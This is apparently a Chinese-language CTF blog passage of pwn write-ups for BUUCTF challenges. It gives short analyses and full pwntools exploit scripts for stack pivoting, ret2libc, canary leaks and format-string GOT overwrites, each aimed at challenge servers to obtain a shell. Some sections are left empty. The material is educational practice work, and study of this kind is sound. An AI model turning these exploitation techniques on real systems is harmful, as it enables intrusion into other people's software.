class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">25513</span>)<br><br>system_addr=<span class="hljs-number">0x8048400</span><span class="hljs-comment">#没有后门函数就自己构造，可能会与ret2libc结合</span><br>leave_ret=<span class="hljs-number">0x08048562</span><span class="hljs-comment">#用ROPgadget找</span><br>padding=<span class="hljs-number">0x28</span><br>offset=<span class="hljs-number">0x38</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(padding-<span class="hljs-number">1</span>)+<span class="hljs-string">b&#x27;b&#x27;</span><span class="hljs-comment">#这里栈溢出覆盖后用b做了个标记方便获取ebp的地址</span><br>io.send(payload)<span class="hljs-comment">#注意使用send输入</span><br>io.recvuntil(<span class="hljs-string">b&quot;b&quot;</span>)<br>s=u32(io.recv(<span class="hljs-number">4</span>))-offset<span class="hljs-comment">#旧ebp-offset=esp（s起始位置）</span><br><span class="hljs-comment">#跳转到s的起始地址，即重新调转到这个栈内执行</span><br><br><span class="hljs-comment">#重新布置栈，进行栈劫持</span><br>payload2=<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(system_addr)+p32(<span class="hljs-number">0xdeadbeef</span>)+p32(s+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&quot;/bin/sh&quot;</span><br>payload2=payload2.ljust(padding,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <br>payload2+=p32(s)+p32(leave_ret)<span class="hljs-comment">#先覆盖ebp，再覆盖返回地址</span><br><br>io.send(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="54-wustctf2020-closed"><a href="#54-wustctf2020-closed" class="headerlink" title="54.wustctf2020_closed"></a>54.wustctf2020_closed</h1><h2 id="1-分析-3"><a href="#1-分析-3" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226215631456.png" alt="image-20240226215631456"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226215931644.png" alt="image-20240226215931644"></p><p>vulnerable</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226220012990.png" alt="image-20240226220012990"></p><p>shell</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226220041388.png" alt="image-20240226220041388"></p><p>给了后门函数，但是没看到溢出点，我们查一下vulnerable中close(1)和close(2)的意思。</p><p>文件描述符为0、1和2 （常说的输入、输出和报错），那么这里的意思就是关闭了标准输出和报错，只剩下标准输入开着。</p><p>看了别人的wp发现这又是linux命令的小知识，我们可以对stdout重定向，将文件描述符 1 重定向到文件描述符 0 ：因此这题不用写exp，直接执行&#x3D;&#x3D;execv 1&gt;&amp;0&#x3D;&#x3D;</p><p>这会执行 <code>execv</code> 程序，并将<code>execv</code> 程序的标准输出重定向到当前终端的标准输入，这样 <code>execv</code> 程序输出的内容会被发送到当前终端，并成为当前终端的输入。</p><p>因为默认打开一个终端后，0，1，2都指向同一个位置也就是当前终端，所以这条语句相当于重启了标准输出，此时就可以执行命令并且看得到输出了</p><h1 id="55-ZJCTF-2019-Login"><a href="#55-ZJCTF-2019-Login" class="headerlink" title="55.[ZJCTF 2019]Login"></a>55.[ZJCTF 2019]Login</h1><h2 id="1-分析-4"><a href="#1-分析-4" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227162243747.png" alt="image-20240227162243747"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227162439575.png" alt="image-20240227162439575"></p><p>终于遇见C++的题了，先去网上学习一下</p><p>看不懂伪代码就先运行一下</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227170458706.png" alt="image-20240227170458706"></p><p>然后IDA上搜索字符串，发现后门在Admin::shell函数这</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227171602957.png" alt="image-20240227171602957"></p><p>那么我们用户名就试试admin的</p><p><strong><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227173608295.png" alt="image-20240227173608295"></strong></p><p>这次是段错误，看来方向对了</p><p>找找有没有溢出点可以跳转到后门函数</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227173757161.png" alt="image-20240227173757161"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227173832640.png" alt="image-20240227173832640"></p><p>两个输入点都有溢出，但是没法溢出到返回地址，看下检查密码的函数</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227174707294.png" alt="image-20240227174707294"></p><p>貌似也没啥问题，没头绪，但是哪里出现了段错误我们还没明白，去pwndbg调调看。</p><p>发现是在password_checker函数这出了问题</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227185020553.png" alt="image-20240227185020553"></p><p>把rax当作函数执行出现了问题，我们看看能不能控制rax里面的内容让它执行后门函数。</p><p>可以看到[rbp+var_68]之前有个mov     [rbp+var_68], rdi的指令，所以我们控制rdi，就能控制这里的rax，总所周知rdi是传参的寄存器，那么我们跳出这个函数，看看rdi在主函数中被谁赋值了</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227203357987.png" alt="image-20240227203357987"></p><p>还是rax，这里的rax又被上面的[rbp+var_130]赋值了，[rbp+var_130]在上面又被rax赋值了，这个rax得去password_checker函数里去看下</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227213021200.png" alt="image-20240227213021200"></p><p>终于看到rax被[rbp+var_18]赋值了，那么只要我们想办法把变量var_18填上后门函数的地址，我们就能控制程序获取shell了。</p><p>进两个输入点看看能不能改变量var_18的内容</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228161841491.png" alt="image-20240228161841491"></p><p>发现读入的s变量下面就存放着var_18变量，偏移是0x48个字节，刚好能溢出到，那就能写exp了。</p><p>由于 <code>fgets</code> 函数会在遇到空字符（’\x00’）或者换行符（’\n’）时停止读取，因此在构造 payload 时使用了 <code>&#39;\x00&#39;</code> 来截断，以确保后续填充的内容不会被 <code>fgets</code> 读取进去，如果格式化字符串过长有可能会破坏我们布置好的shell，这里利用<code>%s</code>的<code>\x00</code>截断</p><h2 id="2-payload-3"><a href="#2-payload-3" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>io=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">25242</span>)<br>shell_addr=<span class="hljs-number">0x400E88</span><br>padding=<span class="hljs-number">0x48</span><br><br>payload=<span class="hljs-string">b&#x27;2jctf_pa5sw0rd&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*(padding-<span class="hljs-number">14</span>)+p64(shell_addr)<br>io.sendline(<span class="hljs-string">&#x27;admin&#x27;</span>)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>总体来说，这题还是ret2text，但是对汇编和溢出点的查找要求更高</p><h1 id="56-jarvisoj-level1"><a href="#56-jarvisoj-level1" class="headerlink" title="56.jarvisoj_level1"></a>56.jarvisoj_level1</h1><h2 id="1-分析-5"><a href="#1-分析-5" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228165812631.png" alt="image-20240228165812631"></p><p>无保护</p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228170052582.png" alt="image-20240228170052582"></p><p>vulnerable_function</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228170305828.png" alt="image-20240228170305828"></p><p>溢出显而易见，没有后门函数和&#x2F;bin&#x2F;sh字符串，所以要么shellcode，要么libc，先libc试试</p><h2 id="2-payload-4"><a href="#2-payload-4" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26472</span>)<br><span class="hljs-comment">#io=process(&#x27;./xxx&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./56&#x27;</span>)<br><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>padding=<span class="hljs-number">0x8c</span><span class="hljs-comment">#偏移地址</span><br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload1 += p32(write_plt)+p32(main_addr)<br>payload1 += p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#根据函数的用法来构造，如果是puts函数则参考64位的方法</span><br><br>io.sendline(payload1)<br><br><span class="hljs-comment">#下面这个需要根据实际情况获取泄露函数真实地址</span><br>write_addr=u32(io.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&#x27;leak_write_real_addr =&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(write_addr)))<br>            <br><span class="hljs-comment">#以下为通用操作</span><br><span class="hljs-string">&#x27;&#x27;&#x27;libc = LibcSearcher(&quot;write&quot;,write_addr)</span><br><span class="hljs-string">libcbase=write_addr-libc.dump(&#x27;write&#x27;)</span><br><span class="hljs-string">system_addr=libcbase+libc.dump(&quot;system&quot;)</span><br><span class="hljs-string">str_bin_sh=libcbase+libc.dump(&#x27;str_bin_sh&#x27;)&#x27;&#x27;&#x27;</span><br><br>libc=ELF(<span class="hljs-string">&#x27;32libc-2.23.so&#x27;</span>)<br>libcbase=write_addr-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>            <br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*padding+p32(system_addr)+p32(<span class="hljs-number">0</span>)+p32(str_bin_sh)<br><br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="57-hitcontraining-magicheap"><a href="#57-hitcontraining-magicheap" class="headerlink" title="57.hitcontraining_magicheap"></a>57.hitcontraining_magicheap</h1><h2 id="1-分析-6"><a href="#1-分析-6" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228175326939.png" alt="image-20240228175326939"></p><p>main</p><h2 id="2-payload-5"><a href="#2-payload-5" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="58-axb-2019-fmt32"><a href="#58-axb-2019-fmt32" class="headerlink" title="58.axb_2019_fmt32"></a>58.axb_2019_fmt32</h1><h2 id="1-分析-7"><a href="#1-分析-7" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228180750105.png" alt="image-20240228180750105"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240301193717057.png" alt="image-20240301193717057"></p><p>read无溢出，但是25行有明显的格式化字符串漏洞</p><p>好久没写格式化字符串的题了，先复习一下</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240301193706562.png" alt="image-20240301193706562"></p><p><strong>格式化字符串</strong>（format string）是一些程序设计语言的输入&#x2F;输出<a href="https://zh.wikipedia.org/wiki/%E5%87%BD%E5%BC%8F%E5%BA%AB">库</a>中能将<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E4%B8%B2">字符串</a>参数转换为另一种形式输出的<a href="https://zh.wikipedia.org/wiki/%E5%AD%90%E7%A8%8B%E5%BA%8F">函数</a>。格式化字符串中的占位符用于指明输出的参数值如何格式化。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240301200537348.png" alt="image-20240301200537348"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240301193952374.png" alt="image-20240301193952374"></p><p>漏洞特征：</p><p>一旦程序编写不规范，比如正确的写法是：<code>printf(&quot;%s&quot;, pad)</code>，偷懒写成了：&#x3D;&#x3D;printf(pad);&#x3D;&#x3D;，此时就存在格式化字符串漏洞。</p><p>因为printf为可变参数，32位linux系统下是用栈传递参数，栈顶指针esp是第一个参数，此时printf就会打印该字符串，如果进一步遇到格式化符号，比如这里的%p，那么就会以十六进制的方式打印第二个参数，但我们并没有传递第二个参数，所以系统还是将esp+0x4的位置当作第二个参数打印了，以此类推。</p><p>网上师傅的这段找参数位置的方法很有用：</p><p>64位的前6个参数存储在寄存器中，顺序为rdi,rsi,rdx,rcx,r8.r9，但是由于ASLR的开启，我们是不知道第7个参数到底在哪里的，我们可以多写几个参数与栈上比对</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240304221057434.png" alt="image-20240304221057434"></p><p>可以看到前2个参数的地址一眼不是栈上的，而第3个是0x7ff开头的，所以是栈上的地址</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305193309038.png" alt="image-20240305193309038"></p><p>x64 前 6 个参数存在寄存器上面，而第一个参数又是格式化字符串，所以这实际上就是第 5+4&#x3D;9 个参数，所以 payload 就写 %9$s</p><p>回到本题，没有后门函数，要用格式化字符串泄露出某个libc函数，来获得libc基址</p><h2 id="2-payload-6"><a href="#2-payload-6" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-string">&quot;28661&quot;</span>)<br>elf=ELF(<span class="hljs-string">&quot;./58&quot;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;32libc-2.23.so&#x27;</span>)<br><br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> + p32(printf_got) +<span class="hljs-string">b&#x27;22&#x27;</span>+ <span class="hljs-string">b&#x27;%8$s&#x27;</span><br>io.sendafter(<span class="hljs-string">b&#x27;me:&#x27;</span>, payload)<br>io.recvuntil(<span class="hljs-string">b&quot;22&quot;</span>)<br>printf_addr = u32(io.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;printf_addr=&quot;</span>+<span class="hljs-built_in">hex</span>(printf_addr))<br><br>libc_base=printf_addr-libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><span class="hljs-string">&#x27;&#x27;&#x27;libc=LibcSearcher(&#x27;printf&#x27;,printf_addr)</span><br><span class="hljs-string">libc_base=printf_addr-libc.dump(&#x27;printf&#x27;)</span><br><span class="hljs-string">system=libc_base+libc.dump(&#x27;system&#x27;)&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;system_addr&quot;</span>+<span class="hljs-built_in">hex</span>(system))<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>+fmtstr_payload(<span class="hljs-number">8</span>,&#123;printf_got:system&#125;,write_size = <span class="hljs-string">&quot;byte&quot;</span>,numbwritten = <span class="hljs-number">0xa</span>)<br><br>io.sendline(payload)<br><br>io.sendline(<span class="hljs-string">b&#x27;;/bin/sh\x00&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="59-others-babystack"><a href="#59-others-babystack" class="headerlink" title="59.others_babystack"></a>59.others_babystack</h1><h2 id="1-分析-8"><a href="#1-分析-8" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305204211555.png" alt="image-20240305204211555"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305204445081.png" alt="image-20240305204445081"></p><p>read漏洞，无后门函数，应该是ret2libc。然后程序有canary保护，我们得先绕过canary。 </p><p>puts函数在输出的时候是遇到’\x00’ 才会结束，我们都知道canary跟在ebp之后，因此我们直接填充‘a’到ebp，正好 可以把canary的截断符覆盖，再输出，就会连canary一起输出了。</p><p>那么思路分析完毕，直接上payload吧</p><h2 id="2-payload-7"><a href="#2-payload-7" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26947</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./59&#x27;</span>)<br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi_ret=<span class="hljs-number">0x400a93</span><br><span class="hljs-comment">#ret=0x40067e#有时栈平衡会需要这个gadget凑数</span><br>main_addr=<span class="hljs-number">0x400908</span><span class="hljs-comment">#elf.sym[&#x27;main&#x27;]</span><br>padding=<span class="hljs-number">0x88</span><span class="hljs-comment">#偏移地址</span><br><br><span class="hljs-comment">#0x01泄露canary</span><br><br>leak_canary=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br><br>io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.sendline(leak_canary)<br>io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>io.recvuntil(<span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>canary=u64(io.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> (<span class="hljs-built_in">hex</span>(canary))<br><br><span class="hljs-comment">#0x02leak puts函数</span><br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload1+=p64(canary)+p64(<span class="hljs-number">0</span>)<br>payload1+=p64(pop_rdi_ret)+p64(puts_got)<br>payload1+=p64(puts_plt)+p64(main_addr)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.sendline(payload1)<br>io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-comment">#让程序正常退出，不然接收不了</span><br>io.recv()<br><br>puts_addr=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak_puts_real_addr =&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br><span class="hljs-comment">#0x03ret2libc</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="hljs-string">libcbase = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="hljs-string">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="hljs-string">str_bin_sh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)&#x27;&#x27;&#x27;</span><br><br>libc=ELF(<span class="hljs-string">&#x27;64libc-2.23.so&#x27;</span>)<br>libcbase = puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))           <br>            <br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*padding+p64(canary)+p64(<span class="hljs-number">0</span>)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.sendline(payload2)<br>io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="60-pwnable-start"><a href="#60-pwnable-start" class="headerlink" title="60.pwnable_start"></a>60.pwnable_start</h1><p>手动写shellcode+内平栈</p><h2 id="1-分析-9"><a href="#1-分析-9" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305214603993.png" alt="image-20240305214603993"></p><h2 id="2-payload-8"><a href="#2-payload-8" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn练习记录</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>41~50</title>
    <link href="/2023/10/11/WP/BUUCTF/41-50/"/>
    <url>/2023/10/11/WP/BUUCTF/41-50/</url>
    
    <content type="html"><![CDATA[<h1 id="41-picoctf-2018-buffer-overflow-1"><a href="#41-picoctf-2018-buffer-overflow-1" class="headerlink" title="41.picoctf_2018_buffer overflow 1"></a>41.picoctf_2018_buffer overflow 1</h1><p>ret2text</p><h2 id="1-分析"><a href="#1-分析" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143121323.png" alt="image-20231011143121323"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143448166.png" alt="image-20231011143448166"></p><p>vuln</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143520072.png" alt="image-20231011143520072"></p><p>gets漏洞</p><p>win</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011161726472.png" alt="image-20231011161726472"></p><p>这里就读出flag了</p><h2 id="2-payload"><a href="#2-payload" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>) <br>io=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27142</span>)<br><br>win_addr=<span class="hljs-number">0x80485cb</span><br>padding=<span class="hljs-number">0x2c</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*padding+p32(win_addr)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;Please enter your string:&#x27;</span>)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="42-ZJCTF-2019-EasyHeap"><a href="#42-ZJCTF-2019-EasyHeap" class="headerlink" title="42.[ZJCTF 2019]EasyHeap"></a>42.[ZJCTF 2019]EasyHeap</h1><p>house of spirit</p><h2 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143138943.png" alt="image-20231011143138943"></p><p>main</p><p>delete_heap</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240408155054479.png" alt="image-20240408155054479"></p><p>l33t</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240408154845470.png" alt="image-20240408154845470"></p><p>后门函数</p><p>用程序定义的 read_input 来修改某个地址的内容，从而劫持程序执行，在上面调用 read_input 的地方可知，写入的地址是一个chunk的首地址，也就是说如果能修改 chunk 